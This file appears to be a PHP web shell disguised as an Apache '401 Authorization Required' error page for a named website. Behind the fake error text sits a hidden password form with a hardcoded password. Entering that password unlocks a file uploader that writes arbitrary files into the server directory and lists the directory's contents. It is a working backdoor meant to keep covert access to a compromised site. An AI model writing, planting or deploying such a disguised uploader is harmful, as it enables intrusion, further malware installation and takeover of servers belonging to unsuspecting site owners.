<html>
<style type="text/css">
input[type=password] {
    /*width: 100%;*/
    /*padding: 12px 20px;*/
    margin: 8px 0;
    box-sizing: border-box;
    border: 2px solid #ffffff;
    border-radius: 4px;
    float: right;
}
</style>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>401 Authorization Required</TITLE>
</HEAD><BODY>
<H1>Authorization Required</H1>
This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.
<HR>
<I>www.thaprachan.com</I>
<?php
echo "<form method='post' action=''>";
echo "<input type='password' name='pass'>";
echo "</form>";
$pass = $_POST['pass'];
$password = stp5940;
if($pass == $password)
{
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yapistir, upload ettik!</b><br><br>'; }
    else { echo '<b>Upload edemedik kanka :(</b><br><br><br><br>'; }
}
$objScan = scandir(".");
foreach ($objScan as $value) {
    echo "folder : $value<br>";
}
}
?>
</BODY></HTML>
